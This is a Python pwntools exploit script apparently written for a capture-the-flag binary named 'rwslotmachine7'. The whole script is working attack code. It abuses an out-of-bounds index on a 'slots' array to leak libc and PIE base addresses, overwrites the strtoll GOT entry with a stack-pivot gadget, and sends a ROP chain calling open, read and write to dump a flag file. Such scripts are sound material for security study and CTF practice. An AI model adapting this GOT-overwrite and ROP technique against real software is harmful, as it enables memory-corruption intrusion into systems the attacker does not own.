from pwn import *

p = process('./rwslotmachine7')
libc = ELF("./libc.so.6")

def do_read(idx):
	p.recvuntil('>')
	p.sendline('1')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil(']: ')
	return int(p.recvuntil('\n')[:-1], 16)

def do_write(idx, value):
	p.recvuntil('>')
	p.sendline('2')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil('value:')
	p.sendline(hex(value))

slots_offset = p.elf.symbols['slots']
strtoll_got_offset = p.elf.got['strtoll']
puts_got_offset = p.elf.got['puts']
dso_handle_offset = p.elf.bss() - 4

index_to_puts = (puts_got_offset - slots_offset) / 4
index_to_dso_handle = (dso_handle_offset - slots_offset) / 4
index_to_strtoll = (strtoll_got_offset - slots_offset) / 4

libc_leak = do_read(index_to_puts)
libc_base = libc_leak - libc.symbols["puts"]

pie_leak = do_read(index_to_dso_handle)
pie_base = (pie_leak & 0xfffff000) - 0x3000
print(hex(pie_base))

libc_gadget_esp_30 = libc_base + 0xdbe1c
pop3 = pie_base + 0xbe9
pop2 = pie_base + 0xbea
pop1 = pie_base + 0x551

filename_payload = unpack_many("./flag\x00\x00", 32)
for i in range(len(filename_payload)):
	do_write(i, filename_payload[i])

open_ = libc_base + libc.symbols["open"]
read_ = libc_base + libc.symbols["read"]
write_ = libc_base + libc.symbols["write"]

rop  = p32(open_) + p32(pop2) + p32(pie_base + slots_offset) + p32(0)
rop += p32(read_) + p32(pop3) + p32(3) + p32(pie_base + slots_offset) + p32(0x50)
rop += p32(write_) + p32(pop3) + p32(1) + p32(pie_base + slots_offset) + p32(0x50)

do_write(index_to_strtoll, libc_gadget_esp_30)
p.sendline('A' * 0xc + rop)

p.interactive()
